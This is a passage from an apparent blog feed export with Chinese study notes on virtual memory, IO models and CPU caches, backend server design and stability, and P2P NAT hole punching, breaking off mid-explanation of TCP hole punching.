<p>在大多数系统中，每个进程对应一个页表。页表中对应每一个虚存页面有一个表项，表项的内容包含该虚存页面所在的主存页面的地址（物理页号），以及指示该逻辑页是否已调入主存的有效位。地址变换时，用逻辑页号作为页表内的偏移地址索引页表（将虚页号看作页表数组下标）并找到相应物理页号，用物理页号作为实存地址的高字段，再与虚地址的页内偏移量拼接，就构成完整的物理地址。现代的中央处理机通常有专门的硬件支持地址变换。</p>
<p>2、转换后援缓冲器由于页表通常在主存中，因而即使逻辑页已经在主存中，也至少要访问两次物理存储器才能实现一次访存，这将使虚拟存储器的存取时间加倍。为了避免对主存访问次数的增多，可以对页表本身实行二级缓存，把页表中的最活跃的部分存放在高速存储器中，组成快表。这个专用于页表缓存的高速存储部件通常称为转换后援缓冲器(TLB)。保存在主存中的完整页表则称为慢表。</p>
<p>3、内页表是虚地址到主存物理地址的变换表，通常称为内页表。与内页表对应的还有外页表，用于虚地址与辅存地址之间的变换。当主存缺页时，调页操作首先要定位辅存，而外页表的结构与辅存的寻址机制密切相关。例如对磁盘而言，辅存地址包括磁盘机号、磁头号、磁道号和扇区号等。</p>
<h3 id="2-2-段式调度"><a href="#2-2-段式调度" class="headerlink" title="2.2. 段式调度"></a>2.2. 段式调度</h3><p>段是按照程序的自然分界划分的长度可以动态改变的区域。通常，程序员把子程序、操作数和常数等不同类型的数据划分到不同的段中，并且每个程序可以有多个相同类型的段。在段式虚拟存储系统中，虚地址由段号和段内地址（偏移量）组成。虚地址到实主存地址的变换通过段表实现。每个程序设置一个段表，段表的每一个表项对应一个段。每个表项至少包含下面三个字段：</p>
<ol>
<li>有效位：指明该段是否已经调入实存。</li>
<li>段起址：指明在该段已经调入实存的情况下，该段在实存中的首地址。</li>
<li>段长：记录该段的实际长度。设置段长字段的目的是为了保证访问某段的地址空间时，段内地址不会超出该段长度导致地址越界而破坏其他段。段表本身也是一个段，可以存在辅存中，但一般驻留在主存中。</li>
</ol>
<p>段式虚拟存储器有许多优点：</p>
<ol>
<li>段的逻辑独立性使其易于编译、管理、修改和保护，也便于多道程序共享。</li>
<li>段长可以根据需要动态改变，允许自由调度，以便有效利用主存空间。</li>
</ol>
<p>段式虚拟存储器也有一些缺点：</p>
<ol>
<li>因为段的长度不固定，主存空间分配比较麻烦。</li>
<li>容易在段间留下许多外碎片，造成存储空间利用率降低。</li>
<li>由于段长不一定是2的整数次幂，因而不能简单地像分页方式那样用虚地址和实地址的最低若干二进制位作为段内偏移量，并与段号进行直接拼接，必须用加法操作通过段起址与段内偏移量的求和运算求得物理地址。因此，段式存储管理比页式存储管理方式需要更多的硬件支持。</li>
</ol>
<h3 id="2-3-段页式调度"><a href="#2-3-段页式调度" class="headerlink" title="2.3. 段页式调度"></a>2.3. 段页式调度</h3><p>段页式虚拟存储器是段式虚拟存储器和页式虚拟存储器的结合。实存被等分成页。每个程序则先按逻辑结构分段，每段再按照实存的页大小分页，程序按页进行调入和调出操作，但可按段进行编程、保护和共享。它把程序按逻辑单位分段以后，再把每段分成固定大小的页。程序对主存的调入调出是按页面进行的，但它又可以按段实现共享和保护，兼备页式和段式的优点。缺点是在映象过程中需要多次查表。在段页式虚拟存储系统中，每道程序是通过一个段表和一组页表来进行定位的。段表中的每个表目对应一个段，每个表目有一个指向该段的页表起始地址及该段的控制保护信息。由页表指明该段各页在主存中的位置以及是否已装入、已修改等状态信息。如果有多个用户在机器上运行，多道程序的每一道需要一个基号,由它指明该道程序的段表起始地址。虚拟地址格式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">　　基号 段号 页号 页内地址</span><br></pre></td></tr></table></figure>

<h2 id="3-变换算法"><a href="#3-变换算法" class="headerlink" title="3. 变换算法"></a>3. 变换算法</h2><p>虚拟存储器地址变换基本上有3种形虚拟存储器工作过程式：全联想变换、直接变换和组联想变换。任何逻辑空间页面能够变换到物理空间任何页面位置的方式称为全联想变换。每个逻辑空间页面只能变换到物理空间一个特定页面的方式称为直接变换。组联想变换是指各组之间是直接变换，而组内各页间则是全联想变换。替换规则用来确定替换主存中哪一部分，以便腾空部分主存，存放来自辅存要调入的那部分内容。常见的替换算法有4种。</p>
<ol>
<li>随机算法：用软件或硬件随机数产生器确定替换的页面。</li>
<li>先进先出：先调入主存的页面先替换。</li>
<li>近期最少使用算法（LRU，Least Recently Used）：替换最长时间不用的页面。</li>
<li>最优算法：替换最长时间以后才使用的页面。这是理想化的算法，只能作为衡量其他各种算法优劣的标准。</li>
</ol>
<p>虚拟存储器的效率是系统性能评价的重要内容，它与主存容量、页面大小、命中率，程序局部性和替换算法等因素有关。</p>
<h1 id="五、io模型"><a href="#五、io模型" class="headerlink" title="五、io模型"></a>五、io模型</h1><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><ul>
<li><code>AIO</code>: 异步io</li>
<li><code>BIO</code>: 阻塞io</li>
<li><code>NIO</code>: 非阻塞io</li>
</ul>
<h2 id="1-同步io"><a href="#1-同步io" class="headerlink" title="1. 同步io"></a>1. 同步io</h2><ul>
<li>指读写io的操作是在同一个线程</li>
<li>linux不存在异步io，epoll和select都属于同步io</li>
</ul>
<h3 id="1-1-阻塞io-accept"><a href="#1-1-阻塞io-accept" class="headerlink" title="1.1. 阻塞io accept"></a>1.1. 阻塞io accept</h3><ul>
<li>正常讲的accept属于阻塞io，读写io需要等待</li>
<li>就算每个链接新开线程，同样是同步io，应用层异步而已</li>
</ul>
<h3 id="1-2-非阻塞io-select"><a href="#1-2-非阻塞io-select" class="headerlink" title="1.2. 非阻塞io select"></a>1.2. 非阻塞io select</h3><ul>
<li>select属于典型的非阻塞io，可以在没有数据时立刻返回</li>
<li>但是由于读写在同一个线程，属于同步非阻塞io</li>
</ul>
<h3 id="1-3-多路复用-epoll"><a href="#1-3-多路复用-epoll" class="headerlink" title="1.3. 多路复用 epoll"></a>1.3. 多路复用 epoll</h3><ul>
<li>select处理是针对单个fd进行，如果想处理多个fd，需要自己写循环，耗时</li>
<li>epoll的调用是注册fd到操作系统，操作系统发现某个fd存在数据，直接返回fd，继续进行操作，更加节省性能</li>
<li>但是由于读写在同一个线程，属于同步非阻塞io</li>
</ul>
<h2 id="2-异步io"><a href="#2-异步io" class="headerlink" title="2. 异步io"></a>2. 异步io</h2><ul>
<li>windows上是异步io实现，系统读取完数据调用回调函数</li>
</ul>
<h1 id="六、cpu介绍"><a href="#六、cpu介绍" class="headerlink" title="六、cpu介绍"></a>六、cpu介绍</h1><h2 id="1-不同型号cpu"><a href="#1-不同型号cpu" class="headerlink" title="1. 不同型号cpu"></a>1. 不同型号cpu</h2><h3 id="1-1-x86"><a href="#1-1-x86" class="headerlink" title="1.1. x86"></a>1.1. x86</h3><h4 id="1-实模式-保护模式-长模式"><a href="#1-实模式-保护模式-长模式" class="headerlink" title="1) 实模式&#x2F;保护模式&#x2F;长模式"></a>1) 实模式&#x2F;保护模式&#x2F;长模式</h4><p>参考 <a href="https://blog.csdn.net/xystrive/article/details/120722344">操作系统——CPU的实模式、保护模式和长模式</a></p>
<ul>
<li>实模式: 16bit，可以调用bios内置函数</li>
<li>保护模式: 32bit，使用GDT来进行分段管理内存</li>
<li>长模式: 64bit，使用mmu进行分页管理内存</li>
</ul>
<h2 id="2-cpu缓存"><a href="#2-cpu缓存" class="headerlink" title="2. cpu缓存"></a>2. cpu缓存</h2><p>参考 <a href="https://zhuanlan.zhihu.com/p/31875174">Cache-L1&#x2F;L2&#x2F;L3&#x2F;TLB</a></p>
<ul>
<li>L1和L2每个cpu一个</li>
<li>L1缓存分为L1i和L1d，分别存储指令和数据</li>
<li>L2缓存不区分指令和数据</li>
<li>L3缓存所有核心公用一个，不区分指令和数据</li>
<li>TLB为MMU服务，缓存MMU转化的页表，可以看 <a href="https://zhuanlan.zhihu.com/p/414868545">一个故事看懂CPU的TLB</a></li>
</ul>
<h2 id="3-cpu中sockets、cores、threads的含义"><a href="#3-cpu中sockets、cores、threads的含义" class="headerlink" title="3. cpu中sockets、cores、threads的含义"></a>3. cpu中sockets、cores、threads的含义</h2><ul>
<li>sockets代表物理上几个插槽</li>
<li>cores代表cpu中有几个核</li>
<li>threads代表单个cpu核心有几个线程</li>
</ul>
<h1 id="七、原子操作"><a href="#七、原子操作" class="headerlink" title="七、原子操作"></a>七、原子操作</h1><h2 id="1-自增操作"><a href="#1-自增操作" class="headerlink" title="1. 自增操作"></a>1. 自增操作</h2><ul>
<li>单核下INC不可分割可以实现原子操作</li>
<li>多核下INC不安全，使用xaddl，会锁内存总线达到原子操作</li>
<li>或者使用CAS，先比较再赋值，如果内存值更改，重新读取进行操作</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>服务端后台开发笔记</title>
    <url>/blogs/2019-03-29-BackgroundDevelopmentNotes/</url>
    <content><![CDATA[<h1 id="一、服务端常用工具"><a href="#一、服务端常用工具" class="headerlink" title="一、服务端常用工具"></a>一、服务端常用工具</h1><ul>
<li>内存kv数据库: redis</li>
<li>关系型数据库: mysql</li>
<li>集群分布式配置: etcd</li>
</ul>
<h1 id="二、服务端设计"><a href="#二、服务端设计" class="headerlink" title="二、服务端设计"></a>二、服务端设计</h1><h2 id="1-常用知识"><a href="#1-常用知识" class="headerlink" title="1. 常用知识"></a>1. 常用知识</h2><h3 id="1-1-互联网三高"><a href="#1-1-互联网三高" class="headerlink" title="1.1. 互联网三高"></a>1.1. 互联网三高</h3><ul>
<li>高可用: High availability</li>
<li>高拓展: High scalability</li>
<li>高性能: High efficiency<ul>
<li>低延迟（响应快）: low latency</li>
<li>高吞吐（高并发）: high throughput</li>
</ul>
</li>
</ul>
<h3 id="1-2-cap"><a href="#1-2-cap" class="headerlink" title="1.2. cap"></a>1.2. cap</h3><ul>
<li>一致性</li>
<li>可用性</li>
<li>强一致性会破坏可用性</li>
</ul>
<h3 id="1-3-一致性"><a href="#1-3-一致性" class="headerlink" title="1.3. 一致性"></a>1.3. 一致性</h3><ul>
<li>强一致性</li>
<li>弱一致性</li>
<li>最终一致性</li>
</ul>
<h2 id="2-注意点"><a href="#2-注意点" class="headerlink" title="2. 注意点"></a>2. 注意点</h2><ol>
<li>升级<ul>
<li>升级: 升级前检查脚本，升级脚本，配置备份，升级后重启，版本号修改，升级失败回退</li>
<li>降级: 支持配置回退</li>
<li>补丁: 考虑失败的回退，文件替换要有备份，可一键回退</li>
<li>定制: 同补丁</li>
<li>在线升级: 发布前最好考虑在线升级，这样出了问题可以后台出静默升级包，不需要一个一个客户去上门</li>
</ul>
</li>
<li>配置<ul>
<li>支持升级的配置转换，并有一条路径线，尽可能支持跨多个版本升级</li>
<li>每天备份所有重要配置，保留7天，可以及时恢复</li>
</ul>
</li>
<li>集群<ul>
<li>集群同步列表</li>
<li>同步后的服务重启</li>
</ul>
</li>
<li>备份<ul>
<li>重要数据设置备份机制，和正在使用的数据分开，失败有恢复机制</li>
</ul>
</li>
<li>安全<ul>
<li>见<a href="/blogs/2020-04-03-secure-develop">安全开发专项笔记</a></li>
</ul>
</li>
</ol>
<h2 id="3-设计干货"><a href="#3-设计干货" class="headerlink" title="3. 设计干货"></a>3. 设计干货</h2><ul>
<li>多进程模块间使用redis做消息订阅机制进行传递消息，当一个模块变化，发送消息，所有订阅此消息的模块都可以受到消息做相应的操作</li>
<li>进程内部可以使用event进行消息订阅机制，一个线程或者模块改了一个东西，发送消息，订阅此消息的模块根据需要相应的改动（这里操作非事务，可能出现失败的情况）</li>
<li>后台执行命令单独提取一个进程进行，只提供接口，不允许直接拼接命令来执行，所有传入参数做防shell注入校验</li>
<li>所有接口在一个统一的地方进行参数校验，不做逻辑校验，统一一套校验机制，不需要再模块执行中做参数合法性校验，但是复杂逻辑的还需要校验</li>
<li>配置转换可以参照这个模式<ul>
<li>所有配置转换脚本均要执行</li>
<li>有一个地方存放执行过哪些配置转换的脚本，执行过的不执行</li>
<li>所有执行的脚本要分为升级和降级两个步骤，这样可以直接进行降级</li>
</ul>
</li>
<li>对所有接口加上权限，针对不同的角色，有不同的权限，增删改查</li>
<li>利用中间件做是否认证校验，洋葱结构，中间件进入调用，出来再次调用</li>
<li>共享内存前面预留一页4k或8k做写保护，里面可以放一些只读配置信息，防止前面踩内存导致未知问题</li>
</ul>
<h2 id="4-集群形态"><a href="#4-集群形态" class="headerlink" title="4. 集群形态"></a>4. 集群形态</h2><ul>
<li>单机不可能存在完全可靠，如果保证持续可用，需要主备集群</li>
</ul>
<h3 id="4-1-主备集群"><a href="#4-1-主备集群" class="headerlink" title="4.1. 主备集群"></a>4.1. 主备集群</h3><ul>
<li>为了追求数据可靠，主备数据基本一致，主挂掉，备机上阵</li>
<li>完全一致性: 主更新数据，要求从更新完成才返回，但是增加了风险，可能从挂掉影响主运行</li>
<li>弱一致性: 主更新数据，从节点进行异步更新数据，但是可能主从数据不一致<ul>
<li>异步请求更新数据</li>
<li>定期同步数据</li>
</ul>
</li>
</ul>
<h3 id="4-2-分片集群"><a href="#4-2-分片集群" class="headerlink" title="4.2. 分片集群"></a>4.2. 分片集群</h3><ul>
<li>数据分片存储在不同的数据服务器上，也叫扩容，主备集群不叫扩容</li>
<li>但是分片集群一般会要求每个分片是一个主备集群，防止数据丢失导致整体不可用</li>
</ul>
<h3 id="4-3-journalnode集群"><a href="#4-3-journalnode集群" class="headerlink" title="4.3. journalnode集群"></a>4.3. journalnode集群</h3><ul>
<li>强一致性</li>
<li>使用相互的是否联通作为统计数据，一般认为联通是双方相互通信</li>
<li>例如，存在5台机器，其中3台相互联通，认为可以对外提供服务，另外2台相互联通认为不可以提供服务</li>
</ul>
<h4 id="1-为什么集群机器数量使用奇数"><a href="#1-为什么集群机器数量使用奇数" class="headerlink" title="1) 为什么集群机器数量使用奇数"></a>1) 为什么集群机器数量使用奇数</h4><ul>
<li>如果存在3台，那么使用2作为可用数值，容许错误机器数为1，风险为2</li>
<li>如果存在4台，那么使用3作为可用数值，容许错误机器数为1，风险为3</li>
<li>使用偶数和奇数比并没有增加容许错误数，反而增加了风险</li>
</ul>
<h2 id="5-提高系统性能"><a href="#5-提高系统性能" class="headerlink" title="5. 提高系统性能"></a>5. 提高系统性能</h2><ul>
<li>延迟降低吞吐也会提升</li>
</ul>
<h3 id="5-1-单机"><a href="#5-1-单机" class="headerlink" title="5.1. 单机"></a>5.1. 单机</h3><h4 id="1-提高响应时间"><a href="#1-提高响应时间" class="headerlink" title="1) 提高响应时间"></a>1) 提高响应时间</h4><ul>
<li>优化算法<ul>
<li>消息队列异步处理</li>
</ul>
</li>
<li>优化锁机制</li>
<li>优化io模型<ul>
<li>异步io模型</li>
<li>缓存</li>
<li>热点数据多级缓存</li>
</ul>
</li>
</ul>
<h4 id="2-提高吞吐量"><a href="#2-提高吞吐量" class="headerlink" title="2) 提高吞吐量"></a>2) 提高吞吐量</h4><ul>
<li>增加线程处理</li>
</ul>
<h3 id="5-2-集群"><a href="#5-2-集群" class="headerlink" title="5.2. 集群"></a>5.2. 集群</h3><h4 id="1-提高响应时间-1"><a href="#1-提高响应时间-1" class="headerlink" title="1) 提高响应时间"></a>1) 提高响应时间</h4><ul>
<li>参考单机</li>
</ul>
<h4 id="2-提高吞吐量-1"><a href="#2-提高吞吐量-1" class="headerlink" title="2) 提高吞吐量"></a>2) 提高吞吐量</h4><ul>
<li>加机器</li>
<li>分库分表</li>
<li>优化集群调度</li>
<li>增加前置负载均衡器</li>
</ul>
<h2 id="6-提高系统稳定性"><a href="#6-提高系统稳定性" class="headerlink" title="6. 提高系统稳定性"></a>6. 提高系统稳定性</h2><h3 id="6-1-几个基本点"><a href="#6-1-几个基本点" class="headerlink" title="6.1. 几个基本点"></a>6.1. 几个基本点</h3><ol>
<li>所有外部调用需要设置超时时间，防止系统阻塞。包括http、rpc、thrift、kafka、redis、mysql、mongo等</li>
<li>新增加的服务需要添加兜底超时时间</li>
<li>连接池隔离，分级使用连接池，保障最核心业务的使用</li>
<li>协程使用事务，需要处理为串行执行，防止并发量大将连接池占满</li>
<li>使用异步请求或队列执行的，需要考虑对端处理不过来而队列满造成的接口阻塞情况</li>
</ol>
<h3 id="6-2-几个问题实例"><a href="#6-2-几个问题实例" class="headerlink" title="6.2. 几个问题实例"></a>6.2. 几个问题实例</h3><h4 id="1-协程启动事务造成数据库连接池占满，重要业务无法执行"><a href="#1-协程启动事务造成数据库连接池占满，重要业务无法执行" class="headerlink" title="1) 协程启动事务造成数据库连接池占满，重要业务无法执行"></a>1) 协程启动事务造成数据库连接池占满，重要业务无法执行</h4><ul>
<li>同一时刻上报大量数据需要落库，服务端处理使用协程优化速度，并且使用了事务进行批量更新</li>
<li>由于每一个协程都使用了一个连接，事务相互之间存在竞争会卡住部分协程，造成总连接池占满，无法执行重要业务</li>
</ul>
<h4 id="2-协程耗尽造成拒绝服务"><a href="#2-协程耗尽造成拒绝服务" class="headerlink" title="2) 协程耗尽造成拒绝服务"></a>2) 协程耗尽造成拒绝服务</h4><ul>
<li>服务端协程数量有限，对于协程使用的不合理，造成大量协程建立并卡住，最终造成服务端没有协程可用，无法对外提供服务</li>
</ul>
<h4 id="3-日志服务器性能不足卡死业务服务"><a href="#3-日志服务器性能不足卡死业务服务" class="headerlink" title="3) 日志服务器性能不足卡死业务服务"></a>3) 日志服务器性能不足卡死业务服务</h4><ul>
<li>日志服务器处理队列满，造成业务服务器打印日志的接口阻塞，无法提供服务</li>
</ul>
<h4 id="4-跨服务调用没有处理超时，造成阻塞"><a href="#4-跨服务调用没有处理超时，造成阻塞" class="headerlink" title="4) 跨服务调用没有处理超时，造成阻塞"></a>4) 跨服务调用没有处理超时，造成阻塞</h4><ul>
<li>跨服务调用，对方挂了，调用接口没有处理超时，卡死造成业务无法访问</li>
</ul>
<h1 id="三、实战分析"><a href="#三、实战分析" class="headerlink" title="三、实战分析"></a>三、实战分析</h1><h2 id="1-优化当前系统达到高性能"><a href="#1-优化当前系统达到高性能" class="headerlink" title="1. 优化当前系统达到高性能"></a>1. 优化当前系统达到高性能</h2><h3 id="1-1-对当前业务系统进行分析（以登陆认证为例）"><a href="#1-1-对当前业务系统进行分析（以登陆认证为例）" class="headerlink" title="1.1. 对当前业务系统进行分析（以登陆认证为例）"></a>1.1. 对当前业务系统进行分析（以登陆认证为例）</h3><ol>
<li>使用并发压力工具如 locust 进行登陆注销的大并发压力测试</li>
<li>过程中进行cpu和内存消耗分析，查看具体占用资源的业务进程</li>
<li>同时开启mysql和redis的qps统计，查看过程中的qps，分析并发登陆的mysql和redis的资源消耗情况</li>
<li>查看iotop的磁盘读写情况，是否存在大量io磁盘读写</li>
<li>单个用户上线的mysql和redis的命令执行次数</li>
<li>空载和大并发用户登陆后的资源消耗情况</li>
</ol>
<h4 id="1-统计图对比"><a href="#1-统计图对比" class="headerlink" title="1) 统计图对比"></a>1) 统计图对比</h4><ol>
<li>并发压力过程中cpu消耗图</li>
<li>内存占用图</li>
<li>磁盘io占用</li>
<li>网络吞吐</li>
<li>mysql的qps</li>
<li>redis的qps</li>
</ol>
<h4 id="2-单机统计分析优化点和性能瓶颈"><a href="#2-单机统计分析优化点和性能瓶颈" class="headerlink" title="2) 单机统计分析优化点和性能瓶颈"></a>2) 单机统计分析优化点和性能瓶颈</h4><ol>
<li>去除mysql、redis调用、磁盘io、cpu高计算的操作查看并发登陆用户的最大值</li>
<li>添加部分mysql和redis的操作查看并发登陆用户的最大值</li>
<li>继续添加mysql和redis草最查看并发登陆用户的最大值</li>
<li>增加部分io磁盘或cpu高计算的操作查看并发登陆用户的最大值</li>
<li>如果要分析新架构语言的场景，参考上述步骤重新测试对比</li>
<li>单用户登陆过程查看执行的redis和mysql语句，分析是否存在可优化的语句</li>
</ol>
<h4 id="3-集群统计分析优化点和性能瓶颈"><a href="#3-集群统计分析优化点和性能瓶颈" class="headerlink" title="3) 集群统计分析优化点和性能瓶颈"></a>3) 集群统计分析优化点和性能瓶颈</h4><ol>
<li>大并发场景查看主从的压力分布</li>
<li>仅打主节点查看</li>
<li>仅打从节点查看，主要用于分析主节点是否会因为某些不合理操作而资源占用高</li>
</ol>
<h4 id="4-几个优化思路"><a href="#4-几个优化思路" class="headerlink" title="4) 几个优化思路"></a>4) 几个优化思路</h4><ol>
<li>配置类主要基于缓存，对可靠性要求不高就异步落盘</li>
<li>查询类语句调用，考虑合并优化，优选redis，次选mysql</li>
<li>减少不必要的调用</li>
<li>占用cpu高的进程，考虑是否可以降低优先级</li>
<li>部分mysql查询语句考虑使用redis缓存实现</li>
<li>下发数据尽量减少不必要的数据，只下发必要数据和增量数据等</li>
</ol>
<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-url编码"><a href="#1-url编码" class="headerlink" title="1. url编码"></a>1. url编码</h2><ul>
<li>url在请求时，除了规定的格式中的符号，参数中的符号必须要转码</li>
<li>例如get请求中的参数如果有特殊字符，需要使用一个在线转码工具转码才能上传，不然服务端解析会失败</li>
</ul>
<h2 id="2-备份"><a href="#2-备份" class="headerlink" title="2. 备份"></a>2. 备份</h2><ul>
<li>大的逻辑改动一定要备份</li>
<li>环境初始状态要备份</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>p2p打洞技术研究</title>
    <url>/blogs/2019-03-23-p2pHoles/</url>
    <content><![CDATA[<h1 id="p2p技术简介"><a href="#p2p技术简介" class="headerlink" title="p2p技术简介"></a>p2p技术简介</h1><p>对等式网络（peer-to-peer，简称P2P），又称点对点技术，是无中心服务器、依靠用户群（peers）交换信息的互联网体系。它的作用在于，网络的参与者共享他们所拥有的一部分硬件资源（处理能力、存储能力、网络连接能力、打印机等），这些共享资源通过网络提供服务和内容，能被其它对等节点(Peer)直接访问而无需经过中间实体，减低以往网路传输中的节点，以降低资料遗失的风险。与有中心服务器的中央网络系统不同，对等网络中的每个用户端既是资源（服务和内容）提供者（Server），又是资源获取者（Client），任何一个节点无法直接找到其他节点，必须依靠其用户群进行信息交流。</p>
<h1 id="p2p网络拓扑图（讲一些废话）"><a href="#p2p网络拓扑图（讲一些废话）" class="headerlink" title="p2p网络拓扑图（讲一些废话）"></a>p2p网络拓扑图（讲一些废话）</h1><img src = "2019_03_23_01.png" width = 50%>

<p>如图，我们可以总结出P2P网络的一些特征：</p>
<ul>
<li><strong>非中心化：</strong> P2P是全分布式系统，网络中的资源和服务分散在所有的节点上，信息的传输和服务的实现都直接在节点之间进行，可以无需中间环节和服务器介入。<br>可扩展性：用户可以随时加入该网络，系统的资源和服务能力随之同步扩充。理论上其可扩展性几乎可以认为是无限的。</li>
<li><strong>健壮性：</strong> 因为服务是分散在各个节点之间的，部分节点或网络遭到破坏对其他部分的影响很小，故P2P具有耐攻击、高容错的特点。P2P网络一般在部分结点失效时能够自动调整整体拓扑，保持其它结点的连通性。P2P网络通常都是以自组织的方式建立起来的，并允许结点自由地加入和离开。</li>
<li><strong>高性价比：</strong> P2P架构可以有效地利用互联网中散布的大量普通结点，将计算任务或存储资料分布到所有结点上。利用其中闲置的计算能力或存储空间，达到高性能计算和海量存储的目的。</li>
<li><strong>隐私保护：</strong> 在P2P网络中，由于信息的传输分散在各节点之间进行而无需经过某个集中环节，用户的隐私信息被窃听和泄漏的可能性大大缩小。</li>
<li><strong>负载均衡：</strong> 由于每个节点既是服务器又是客户端，减少了传统C&#x2F;S模型中对服务器计算能力、存储的要求，同时因为资源分布在多个节点，更好的实现了整个网络的负载均衡。</li>
</ul>
<h1 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h1><h2 id="分包发送"><a href="#分包发送" class="headerlink" title="分包发送"></a>分包发送</h2><p>由于p2p是点到点的连接，文件从多个的节点上获取，就需要将文件进行分块处理。这一部分主要是文件的分包、排序、校验和合并的过程，不是很难的技术。</p>
<h2 id="文件下载技术"><a href="#文件下载技术" class="headerlink" title="文件下载技术"></a>文件下载技术</h2><h3 id="种子文件信息"><a href="#种子文件信息" class="headerlink" title="种子文件信息"></a>种子文件信息</h3><p>拿bittorrent距离，种子文件储存的信息有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- info：存储资源文件的元信息</span><br><span class="line">    - piece length</span><br><span class="line">    - pieces</span><br><span class="line">    - name/path</span><br><span class="line">- announce：描述tracker服务器的URL</span><br></pre></td></tr></table></figure>

<ul>
<li><p>info：info键对应的值又是一个字典结构，BT协议将一个文件分成若干块，便于客户端从各个主机下载各个块。其中的piece length键值对表示一个块的长度，通畅情况下是2的n次方，根据文件大小有所权衡，通长越大的文件piece length越大以减少piece的数量，降低piece数量一方面降低了种子文件保存块信息数目的大小，一方面也减少了下载时需要对块做的确认操作，加快下载速度。目前块的大小通常是256KB，512KB或者1MB。</p>
</li>
<li><p>pieces：表示每个块的正确性验证信息，每一块均对应一个唯一的SHA1散列值。该键对应的值是所有块的SHA1散列值（每个块所对应的散列值大小为20字节）连接而成的字符串。</p>
</li>
<li><p>name&#x2F;path：表示具体文件的信息。因为BitTorrent协议允许将数个文件和文件夹作为一个BT下载进行发布，因此下载方可以根据需要勾选某一些下载文件。注意，这里将数个文件也砍成一个数据流，因此一个piece如果在文件边界上，可能包含不同文件的信息。</p>
</li>
<li><p>announce：保存的是tracker服务器的URL，在一些扩展协议中，announce可以保存多个tracker服务器作为备选。</p>
</li>
</ul>
<h3 id="tracker服务器"><a href="#tracker服务器" class="headerlink" title="tracker服务器"></a>tracker服务器</h3><p>一般p2p连接下载文件需要有一个公网下的tracker服务器帮助获得各个节点的信息，服务器上面保存了各个文件的节点列表。节点列表中的各个节点可以随时加入和退出，列表中一般储存的是</p>
<ul>
<li>文件的编码值</li>
<li>节点名称</li>
<li>ip</li>
<li>port</li>
</ul>
<p>当一个节点想要下载某个文件，向tracker服务器上请求节点列表，然后连接各个节点进行下载传输。</p>
<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>到这里是大多数网上讲解p2p的内容，但有一个关键的技术没有说明，就是内网穿透。</p>
<img src = "2019_03_23_02.png" width = 60%>

<p>节点通常是各个用户的电脑，所处环境一般为局域网内。总所周知局域网的路由器维护一个nat列表，会将不请自来的消息过滤掉，也保证了网络的安全性。但对于p2p来说就比较麻烦，无法让两个局域网内的节点相互建立连接进行文件传输。这里讲两个重要的内网穿透技术：UDP打洞和TCP打洞</p>
<p>打洞之前需要了解一下路由器的nat类型，部分nat类型不支持打洞。</p>
<h3 id="NAT类型"><a href="#NAT类型" class="headerlink" title="NAT类型"></a>NAT类型</h3><ol>
<li><strong>全克隆(Full Cone):</strong> NAT把所有来自相同内部IP地址和端口的请求映射到相同的外部IP地址和端口。任何一个外部主机均可通过该映射发送IP包到该内部主机。</li>
<li><strong>限制性克隆(Restricted Cone):</strong> NAT把所有来自相同内部IP地址和端口的请求映射到相同的外部IP地址和端口。但是，只有当内部主机先给IP地址为X的外部主机发送IP包，该外部主机才能向该内部主机发送IP包。</li>
<li><strong>端口限制性克隆(Port Restricted Cone):</strong> 端口限制性克隆与限制性克隆类似，只是多了端口号的限制，即只有内部主机先向IP地址为X，端口号为P的外部主机发送1个IP包，该外部主机才能够把源端口号为P的IP包发送给该内部主机。</li>
<li><strong>对称式NAT(Symmetric NAT):</strong> 这种类型的NAT与上述3种类型的不同，在于当同一内部主机使用相同的端口与不同地址的外部主机进行通信时， NAT对该内部主机的映射会有所不同。对称式NAT不保证所有会话中的私有地址和公开IP之间绑定的一致性。相反，它为每个新的会话分配一个新的端口号。</li>
</ol>
<ul>
<li>第一种最为理想，基本就是无需打洞；</li>
<li>第四种最糟糕，根本就不能打洞。好消息就是这种nat基本没有，很少。</li>
<li>所以关键是第二和第三种nat类型。</li>
</ul>
<h3 id="UDP打洞"><a href="#UDP打洞" class="headerlink" title="UDP打洞"></a>UDP打洞</h3><p>先讲UDP打洞主要是因为UDP打洞要比TCP打洞方便的多，而且UDP传输的速度也要比TCP快很多。</p>
<p>UDP打洞主要是建立两边路由器NAT的规则，分为以下几步进行：</p>
<ol>
<li>两个节点A、B都向公网内的tracker服务器C发送数据，两边的NAT-A和NAT-B就有了一条规则$A \Leftrightarrow C$和$B \Leftrightarrow C$，允许A和B接收来自C的数据。</li>
<li>服务器C获得了A和B在公网映射的ip和端口，交叉发送给对方。</li>
<li><strong>关键点</strong> A向B在公网映射的ip和端口发送一条数据，会被NAT-B拦截过滤掉，因为没有这条NAT规则。<strong>但是</strong>NAT-A中多了一条规则$A \Leftrightarrow B$。</li>
<li>这时候B向A发送一条数据就可以畅通无阻地通过NAT-A到达A。<strong>这时</strong>NAT-B也有了一条规则$B \Leftrightarrow A$。到这里A和B就可以进行UDP通信了。</li>
</ol>
<p>这一步已经通过两台电脑加上两个虚拟机验证过了，方案可行。</p>
<h3 id="TCP打洞"><a href="#TCP打洞" class="headerlink" title="TCP打洞"></a>TCP打洞</h3><p>TCP打洞和UDP打洞的原理类似，但是由于</p>
<ul>
<li>TCP连接需要三次握手</li>
<li>TCP client占用一个端口只能连接一个服务器</li>
<li>TCP server可以连接多个TCP client</li>
</ul>
<p>这里就有些麻烦，分为以下几步进行：</p>
<ol>
<li>两个节点A、B都和公网内的tracker服务器C的<strong>主连接端口</strong>进行TCP连接，服务器C获得了A和B在公网映射的ip和端口，<strong>这个连接不会断掉</strong>，通过这个连接也可以维护节点列表。</li>
